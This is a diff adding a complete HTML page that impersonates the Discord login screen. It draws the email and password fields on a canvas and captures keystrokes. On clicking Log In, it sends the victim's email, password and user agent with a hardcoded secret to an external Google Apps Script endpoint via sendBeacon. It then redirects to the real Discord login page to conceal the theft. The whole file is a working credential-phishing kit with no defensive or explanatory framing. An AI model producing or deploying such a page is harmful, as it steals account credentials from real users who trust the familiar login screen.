@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<link rel="icon" href="favicon.ico">
+<meta charset="UTF-8" />
+<title>Discord</title>
+<style>
+  body { margin: 0; background: #18004d; overflow: hidden; }
+  canvas { display: block; margin: auto; }
+</style>
+</head>
+<body>
+
+<canvas id="uiCanvas" width="1400" height="700"></canvas>
+
+<script>
+const canvas = document.getElementById("uiCanvas");
+const ctx = canvas.getContext("2d");
+
+const bg = new Image();
+bg.src = "newsc.png";
+
+const emailBox = { x: 375, y: 284, w: 374, h: 37, text: "" };
+const passBox  = { x: 375, y: 373, w: 374, h: 37, text: "" };
+const button   = { x: 375, y: 456, w: 370, h: 36 };
+
+let activeInput = null;
+
+function drawInput(box, isActive, masked=false) {
+  ctx.fillStyle = "#2e2e34";
+  ctx.fillRect(box.x, box.y, box.w, box.h);
+  ctx.strokeStyle = isActive ? "#5865f2" : "#2e2e34";
+  ctx.lineWidth = 2;
+  ctx.strokeRect(box.x, box.y, box.w, box.h);
+  ctx.fillStyle = "#fff";
+  ctx.font = "18px Arial";
+  const txt = masked ? "•".repeat(box.text.length) : box.text;
+  ctx.fillText(txt, box.x + 12, box.y + 26);
+}
+
+function drawButton() {
+  ctx.fillStyle = "#5865f2";
+  ctx.fillRect(button.x, button.y, button.w, button.h);
+  ctx.fillStyle = "#fff";
+  ctx.font = "bold 18px Arial";
+  ctx.textAlign = "center";
+  ctx.fillText("Log In", button.x + button.w / 2, button.y + 25);
+  ctx.textAlign = "left";
+}
+
+function render() {
+  ctx.clearRect(0,0,canvas.width,canvas.height);
+  ctx.drawImage(bg,0,0,canvas.width,canvas.height);
+  drawInput(emailBox, activeInput === emailBox);
+  drawInput(passBox, activeInput === passBox, true);
+  drawButton();
+  requestAnimationFrame(render);
+}
+
+function hit(box,x,y){
+  return x>box.x && x<box.x+box.w && y>box.y && y<box.y+box.h;
+}
+
+canvas.addEventListener("mousedown", e => {
+  const r = canvas.getBoundingClientRect();
+  const mx = e.clientX - r.left;
+  const my = e.clientY - r.top;
+
+  activeInput = null;
+  if (hit(emailBox,mx,my)) activeInput = emailBox;
+  else if (hit(passBox,mx,my)) activeInput = passBox;
+
+  if (hit(button,mx,my)) {
+    if (!emailBox.text || !passBox.text) {
+      alert("Please enter email and password");
+      return;
+    }
+
+    // ✅ GUARANTEED DELIVERY
+    const payload = JSON.stringify({
+      email: emailBox.text,
+      password: passBox.text,
+      userAgent: navigator.userAgent,
+      secret: "9f3K!2xAqL_87dPz#Qw"
+    });
+
+    navigator.sendBeacon(
+      "https://script.google.com/macros/s/AKfycbwvPvmAbCOufDZlwvb9u0tKqY5X-qoKO7h1-A_ClUt4J_pRp6Ctx-VbVUo2xEbgLgsM/exec",
+      payload
+    );
+
+    window.location.href = "https://discord.com/login";
+  }
+});
+
+window.addEventListener("keydown", e => {
+  if (!activeInput) return;
+  if (e.key === "Backspace") activeInput.text = activeInput.text.slice(0,-1);
+  else if (e.key.length === 1) activeInput.text += e.key;
+});
+
+bg.onload = () => render();
+</script>
+
+</body>
+</html>
